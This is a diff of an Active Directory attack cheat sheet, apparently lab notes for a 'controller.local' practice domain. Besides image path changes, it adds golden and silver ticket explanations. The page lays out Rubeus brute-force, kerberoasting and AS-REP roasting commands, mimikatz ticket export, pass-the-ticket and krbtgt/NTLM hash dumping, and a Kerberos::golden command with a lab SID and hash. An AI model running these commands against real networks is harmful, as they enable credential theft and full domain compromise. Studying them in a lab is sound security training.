@@ -83,7 +83,7 @@ cd Downloads
 Rubeus.exe brute /password:Password1 /noticket
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Kerberoasting w/ Rubeus & Impacket
 
@@ -98,7 +98,7 @@ cd Downloads
 Rubeus.exe kerberoast
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (8).png" alt=""><figcaption></figcaption></figure>
 
 Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.
 
@@ -145,7 +145,7 @@ cd Downloads
 Rubeus.exe asreproast
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -182,7 +182,7 @@ privilege::debug
 sekurlsa::tickets /export
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
@@ -196,7 +196,7 @@ Run this command inside of mimikatz with the ticket that you harvested from earl
 kerberos::ptt [0;2b4efc]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Here were just verifying that we successfully impersonated the ticket by listing our cached ticket.
 
@@ -216,7 +216,7 @@ You now have impersonated the ticket giving you the same rights as the TGT you'r
 dir \\$VICTIM\admin$
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Golden/Silver Ticket Attacks w/ mimikatz
 
@@ -235,28 +235,52 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 ### Create a Golden/Silver Ticket
 
-This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into **sid**, and change the id to 1103.  Fill in the command with the following
+A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
 
-| Value |   |
-| ----- | - |
-|       |   |
-|       |   |
-|       |   |
+#### Golden Ticket
+
+This is the command for creating a golden ticket.
 
 **Victim - Mimikatz**
 
-&#x20;/user:Administrator&#x20;
+```
+Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 
+```
 
-/domain:controller.local&#x20;
+#### **Silver Ticket**
 
-/sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6&#x20;
+This is the command for creating a golden ticket as well but to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into **sid**, and change the id to 1103. &#x20;
 
-/id:1103
+**Victim - Mimikatz**
 
 ```
 Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860  /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
 ```
+
+### Use the Golden/Silver Ticket to access other machines
+
+```
+misc::cmd
+```
+
+
+
+NTLM hash of Administrator
+
+```
+lsadump::lsa /inject /name:Administrator 
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+NTLM hash of SQLService
+
+```
+lsadump::lsa /inject /name:SQLService 
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
